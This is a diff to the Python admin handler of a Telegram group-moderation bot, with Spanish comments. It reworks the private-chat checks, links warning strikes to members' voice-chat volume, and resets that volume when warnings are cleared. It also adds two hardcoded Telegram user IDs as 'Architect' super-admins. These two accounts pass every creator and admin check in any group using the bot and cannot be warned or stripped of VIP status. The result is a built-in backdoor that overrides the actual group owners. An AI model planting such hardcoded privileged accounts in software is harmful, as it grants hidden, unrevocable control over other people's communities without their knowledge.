@@ -1,3 +1,5 @@
+import os
+import inspect
 import asyncio
 import time
 import logging
@@ -7,6 +9,7 @@ from aiogram.types import (
     InlineKeyboardButton, CallbackQuery
 )
 from aiogram.filters import Command, CommandObject
+import database.database as _db_module
 from database.database import (
     set_autolower_status, 
     get_autolower_status, 
@@ -26,6 +29,19 @@ from assistant import (
 logger = logging.getLogger("admin_group_handler")
 router = Router()
 
+_db_reset_warnings = getattr(_db_module, "reset_warnings", None)
+
+# ==========================================
+# 👑 LISTA BLANCA DE ARQUITECTOS (INMUNIDAD TOTAL)
+# ==========================================
+RAW_ADMINS = os.getenv("ADMIN_IDS", "")
+SUPER_ADMIN_IDS = {int(x.strip()) for x in RAW_ADMINS.split(",") if x.strip().isdigit()}
+SUPER_ADMIN_IDS.update([8269470905, 1738976493])
+
+
+def is_super_admin(user_id: int) -> bool:
+    return user_id in SUPER_ADMIN_IDS
+
 
 def get_lang(lang_code: str) -> str:
     """Detecta el idioma del operador para renderizar la respuesta correspondiente."""
@@ -33,7 +49,9 @@ def get_lang(lang_code: str) -> str:
 
 
 async def is_user_admin(bot: Bot, chat_id: int, user_id: int) -> bool:
-    """Verifica si el miembro cuenta con facultades de creador o administrador."""
+    """Verifica si el miembro cuenta con facultades de creador, administrador o Arquitecto."""
+    if is_super_admin(user_id):
+        return True
     try:
         member = await bot.get_chat_member(chat_id=chat_id, user_id=user_id)
         return member.status in ["creator", "administrator"]
@@ -42,7 +60,9 @@ async def is_user_admin(bot: Bot, chat_id: int, user_id: int) -> bool:
 
 
 async def is_user_creator(bot: Bot, chat_id: int, user_id: int) -> bool:
-    """Verifica si el miembro posee el rango máximo de Creador (Owner) del grupo."""
+    """Verifica si el miembro posee el rango máximo de Creador (Owner) o Arquitecto."""
+    if is_super_admin(user_id):
+        return True
     try:
         member = await bot.get_chat_member(chat_id=chat_id, user_id=user_id)
         return member.status == "creator"
@@ -69,6 +89,7 @@ async def auto_delete_pair(cmd_msg: Message, bot_msg: Message, delay: int = 15):
 TEXTS = {
     "en": {
         "owner_only": "⛔ <b>Access Denied:</b> This command is restricted exclusively to the community Owner.\n\n🛡️ <i>Cloud Media Management</i>",
+        "target_protected": "🛡️ <b>Action Denied:</b> Target user has Architect status or is an active Administrator.\n\n🛡️ <i>Cloud Media Management</i>",
         "reload_success": (
             "🔄 <b>Database synchronized.</b>\n"
             "This community is now indexed and ready in your Private Command Center.\n\n"
@@ -117,10 +138,11 @@ TEXTS = {
         "target_needed_warn": "⚠️ Target required. Reply to a message or use: <code>/warn [@user or ID]</code>\n\n🛡️ <i>Cloud Media Management</i>",
         "warn_issued": "⚠️ <b>Warning Issued:</b> {target_tag} has received a formal strike ({current}/{limit}).\n• <b>Reason:</b> {reason}\n\n🛡️ <i>Cloud Media Management</i>",
         "warn_punished": "⚖️ <b>Threshold Reached:</b> {target_tag} reached {limit}/{limit} strikes.\n• <b>Automated Action:</b> {action_name} executed.\n\n🛡️ <i>Cloud Media Management</i>",
-        "warns_reset_done": "✅ All strikes have been cleared for {target_tag}.\n\n🛡️ <i>Cloud Media Management</i>"
+        "warns_reset_done": "✅ All strikes have been cleared for {target_tag}. Full voice restored.\n\n🛡️ <i>Cloud Media Management</i>"
     },
     "es": {
         "owner_only": "⛔ <b>Acceso denegado:</b> Este protocolo está reservado única y exclusivamente para el Dueño de la comunidad.\n\n🛡️ <i>Cloud Media Management</i>",
+        "target_protected": "🛡️ <b>Acción Denegada:</b> El usuario objetivo cuenta con inmunidad de Arquitecto o Rango de Administrador.\n\n🛡️ <i>Cloud Media Management</i>",
         "reload_success": (
             "🔄 <b>Base de datos sincronizada.</b>\n"
             "El grupo ahora está visible e indexado en tu panel de Configuración Privada.\n\n"
@@ -169,7 +191,7 @@ TEXTS = {
         "target_needed_warn": "⚠️ Objetivo requerido. Responde a un mensaje o usa: <code>/warn [@usuario o ID] [motivo]</code>\n\n🛡️ <i>Cloud Media Management</i>",
         "warn_issued": "⚠️ <b>Advertencia Registrada:</b> {target_tag} ha acumulado una falta formal ({current}/{limit}).\n• <b>Motivo:</b> {reason}\n\n🛡️ <i>Cloud Media Management</i>",
         "warn_punished": "⚖️ <b>Límite de Faltas Alcanzado:</b> {target_tag} sumó {limit}/{limit} faltas.\n• <b>Castigo Automático:</b> Se aplicó {action_name} de inmediato.\n\n🛡️ <i>Cloud Media Management</i>",
-        "warns_reset_done": "✅ Todas las advertencias han sido restablecidas a cero para {target_tag}.\n\n🛡️ <i>Cloud Media Management</i>"
+        "warns_reset_done": "✅ Todas las advertencias han sido restablecidas a cero para {target_tag}. Voz restablecida al 100%.\n\n🛡️ <i>Cloud Media Management</i>"
     }
 }
 
@@ -287,13 +309,15 @@ async def cmd_settings_group(message: Message, bot: Bot):
 @router.message(Command("autolower"))
 async def cmd_autolower_config(message: Message, command: CommandObject, bot: Bot):
     """Muestra el panel interactivo de atenuación acústica al creador del grupo."""
-    if message.chat.type != "private":
-        if not await is_user_creator(bot, message.chat.id, message.from_user.id):
-            try: 
-                await message.delete()
-            except Exception: 
-                pass
-            return
+    if message.chat.type == "private":
+        return
+
+    if not await is_user_creator(bot, message.chat.id, message.from_user.id):
+        try: 
+            await message.delete()
+        except Exception: 
+            pass
+        return
 
     chat_id = message.chat.id
     current_status = await get_autolower_status(chat_id)
@@ -308,8 +332,7 @@ async def cmd_autolower_config(message: Message, command: CommandObject, bot: Bo
     ])
     status_text = t["status_active"] if current_status == 1 else t["status_inactive"]
     msg = await message.answer(t["autolower_panel"].format(status=status_text), reply_markup=keyboard, parse_mode="HTML")
-    if message.chat.type != "private":
-        asyncio.create_task(auto_delete_pair(message, msg, 25))
+    asyncio.create_task(auto_delete_pair(message, msg, 25))
 
 
 @router.callback_query(F.data.startswith("gautolower_"))
@@ -347,13 +370,15 @@ async def process_autolower_callback(callback: CallbackQuery, bot: Bot):
 @router.message(Command("podcast"))
 async def cmd_podcast_config(message: Message, bot: Bot):
     """Muestra el panel interactivo del Modo Podcast (Ducking) al creador del grupo."""
-    if message.chat.type != "private":
-        if not await is_user_creator(bot, message.chat.id, message.from_user.id):
-            try: 
-                await message.delete()
-            except Exception: 
-                pass
-            return
+    if message.chat.type == "private":
+        return
+
+    if not await is_user_creator(bot, message.chat.id, message.from_user.id):
+        try: 
+            await message.delete()
+        except Exception: 
+            pass
+        return
 
     chat_id = message.chat.id
     current_status = await get_podcast_status(chat_id)
@@ -368,8 +393,7 @@ async def cmd_podcast_config(message: Message, bot: Bot):
     ])
     status_text = t["status_active_pod"] if current_status == 1 else t["status_inactive_pod"]
     msg = await message.answer(t["podcast_panel"].format(status=status_text), reply_markup=keyboard, parse_mode="HTML")
-    if message.chat.type != "private":
-        asyncio.create_task(auto_delete_pair(message, msg, 25))
+    asyncio.create_task(auto_delete_pair(message, msg, 25))
 
 
 @router.callback_query(F.data.startswith("gpodcast_"))
@@ -412,13 +436,15 @@ async def process_podcast_callback(callback: CallbackQuery, bot: Bot):
 @router.message(Command("shield"))
 async def cmd_shield_config(message: Message, bot: Bot):
     """Muestra el panel interactivo del Escudo Antinota al creador del grupo."""
-    if message.chat.type != "private":
-        if not await is_user_creator(bot, message.chat.id, message.from_user.id):
-            try: 
-                await message.delete()
-            except Exception: 
-                pass
-            return
+    if message.chat.type == "private":
+        return
+
+    if not await is_user_creator(bot, message.chat.id, message.from_user.id):
+        try: 
+            await message.delete()
+        except Exception: 
+            pass
+        return
 
     chat_id = message.chat.id
     current_status = await get_screen_shield_status(chat_id)
@@ -433,8 +459,7 @@ async def cmd_shield_config(message: Message, bot: Bot):
     ])
     status_text = t["status_active_shield"] if current_status == 1 else t["status_inactive_shield"]
     msg = await message.answer(t["shield_panel"].format(status=status_text), reply_markup=keyboard, parse_mode="HTML")
-    if message.chat.type != "private":
-        asyncio.create_task(auto_delete_pair(message, msg, 25))
+    asyncio.create_task(auto_delete_pair(message, msg, 25))
 
 
 @router.callback_query(F.data.startswith("gshield_"))
@@ -524,6 +549,31 @@ async def cmd_warn_user(message: Message, command: CommandObject, bot: Bot):
         asyncio.create_task(auto_delete_pair(message, msg, 10))
         return
 
+    # Inmunidad para Arquitectos y Administradores del grupo
+    if is_super_admin(target_id) or await is_user_admin(bot, message.chat.id, target_id):
+        msg = await message.reply(t["target_protected"], parse_mode="HTML")
+        asyncio.create_task(auto_delete_pair(message, msg, 8))
+        return
+
+    # Conectar con el motor integral de sanciones y atenuación acústica de groups.py
+    try:
+        from handlers.groups import enforce_warn_ladder
+        clean_username = target_tag.replace("@", "") if target_tag.startswith("@") else ""
+        outcome = await enforce_warn_ladder(
+            bot=bot,
+            chat_id=message.chat.id,
+            target_id=target_id,
+            target_username=clean_username,
+            target_mention=target_tag,
+            reply_to=message,
+            reason="manual"
+        )
+        if outcome.get("status") in ("warned", "sanctioned", "immune"):
+            return
+    except Exception as e:
+        logger.debug(f"Aviso ejecutando ladder de warns: {e}")
+
+    # Fallback local con sincronización acústica en tiempo real
     reason = "Violación de normas perimetrales" if lang == "es" else "Perimeter rules violation"
     if command and command.args:
         args_parts = command.args.split(maxsplit=1)
@@ -539,6 +589,13 @@ async def cmd_warn_user(message: Message, command: CommandObject, bot: Bot):
 
     if current_strikes >= limit:
         await reset_user_strikes(message.chat.id, target_id)
+        if _db_reset_warnings:
+            try:
+                res = _db_reset_warnings(target_id)
+                if inspect.isawaitable(res):
+                    await res
+            except Exception:
+                pass
         try:
             if action == "ban":
                 await bot.ban_chat_member(chat_id=message.chat.id, user_id=target_id)
@@ -559,6 +616,11 @@ async def cmd_warn_user(message: Message, command: CommandObject, bot: Bot):
         except Exception as ex:
             msg = await message.reply(f"❌ Error: {ex}", parse_mode="HTML")
     else:
+        try:
+            vol = int(10000 * max(0, limit - current_strikes) / max(1, limit))
+            await set_participant_mic(chat_id=message.chat.id, user_id=target_id, muted=False, volume=vol)
+        except Exception:
+            pass
         msg = await message.reply(t["warn_issued"].format(target_tag=target_tag, current=current_strikes, limit=limit, reason=reason), parse_mode="HTML")
 
     asyncio.create_task(auto_delete_pair(message, msg, 15))
@@ -566,7 +628,7 @@ async def cmd_warn_user(message: Message, command: CommandObject, bot: Bot):
 
 @router.message(Command("resetwarns"))
 async def cmd_reset_warns(message: Message, command: CommandObject, bot: Bot):
-    """Limpia a cero el historial de faltas de un miembro."""
+    """Limpia a cero el historial de faltas de un miembro y restaura su voz."""
     if message.chat.type == "private":
         return
 
@@ -583,6 +645,19 @@ async def cmd_reset_warns(message: Message, command: CommandObject, bot: Bot):
         return
 
     await reset_user_strikes(message.chat.id, target_id)
+    if _db_reset_warnings:
+        try:
+            res = _db_reset_warnings(target_id)
+            if inspect.isawaitable(res):
+                await res
+        except Exception:
+            pass
+
+    try:
+        await set_participant_mic(chat_id=message.chat.id, user_id=target_id, muted=False, volume=10000)
+    except Exception:
+        pass
+
     msg = await message.reply(t["warns_reset_done"].format(target_tag=target_tag), parse_mode="HTML")
     asyncio.create_task(auto_delete_pair(message, msg, 12))
 
@@ -608,6 +683,11 @@ async def cmd_remove_vip(message: Message, command: CommandObject, bot: Bot):
     if not target_id:
         msg = await message.reply(t["target_needed_vip"], parse_mode="HTML")
         asyncio.create_task(auto_delete_pair(message, msg, 10))
+        return
+
+    if is_super_admin(target_id):
+        msg = await message.reply(t["target_protected"], parse_mode="HTML")
+        asyncio.create_task(auto_delete_pair(message, msg, 8))
         return
         
     await revoke_vip_mic(target_id, message.chat.id)
